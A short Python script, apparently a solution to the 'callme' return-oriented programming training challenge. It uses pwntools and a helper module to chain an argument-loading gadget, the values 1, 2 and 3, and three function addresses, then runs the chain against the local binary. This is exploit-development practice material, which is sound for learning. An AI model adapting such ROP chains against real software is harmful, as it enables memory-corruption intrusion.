#!/usr/bin/python

import sys
import pwn
import time

import util

def main():
    loadargs = 0x0000000000401ab0
    argchain = [loadargs, 1, 2, 3]
    addr1 = argchain + [0x00401850]
    addr2 = argchain + [0x00401870]
    addr3 = argchain + [0x00401810]

    addrs = addr1 + addr2 + addr3

    chain = util.chain(addrs)
    print chain
    print util.runchain('./callme', chain)

if __name__ == '__main__':
    main()
